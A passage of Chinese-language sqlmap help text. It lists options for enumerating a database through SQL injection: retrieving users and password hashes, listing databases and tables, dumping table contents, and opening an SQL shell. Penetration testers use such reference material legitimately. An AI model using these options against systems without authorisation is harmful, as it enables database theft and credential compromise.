  • --safe-freq=SAFREQ 两次访问之间测试请求，给出安全的URL

Enumeration（枚举）：

这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行
您自己的SQL语句。

  • -b, --banner 检索数据库管理系统的标识
  • --current-user 检索数据库管理系统当前用户
  • --current-db 检索数据库管理系统当前数据库
  • --is-dba 检测DBMS当前用户是否DBA
  • --users 枚举数据库管理系统用户
  • --passwords 枚举数据库管理系统用户密码哈希
  • --privileges 枚举数据库管理系统用户的权限
  • --roles 枚举数据库管理系统用户的角色
  • --dbs 枚举数据库管理系统数据库
  • -D DBname 要进行枚举的指定数据库名
  • -T TBLname 要进行枚举的指定数据库表（如：-T tablename --columns）
  • --tables 枚举的DBMS数据库中的表
  • --columns 枚举DBMS数据库表列
  • --dump 转储数据库管理系统的数据库中的表项
  • --dump-all 转储所有的DBMS数据库表中的条目
  • --search 搜索列（S），表（S）和/或数据库名称（S）
  • -C COL 要进行枚举的数据库列
  • -U USER 用来进行枚举的数据库用户
  • --exclude-sysdbs 枚举表时排除系统数据库
  • --start=LIMITSTART 第一个查询输出进入检索
  • --stop=LIMITSTOP 最后查询的输出进入检索
  • --first=FIRSTCHAR 第一个查询输出字的字符检索
  • --last=LASTCHAR 最后查询的输出字字符检索
  • --sql-query=QUERY 要执行的SQL语句
  • --sql-shell 提示交互式SQL的shell

Optimization（优化）：

这些选项可用于优化SqlMap的性能。

  • -o 开启所有优化开关

  • --keep-alive 使用持久的HTTP（S）连接
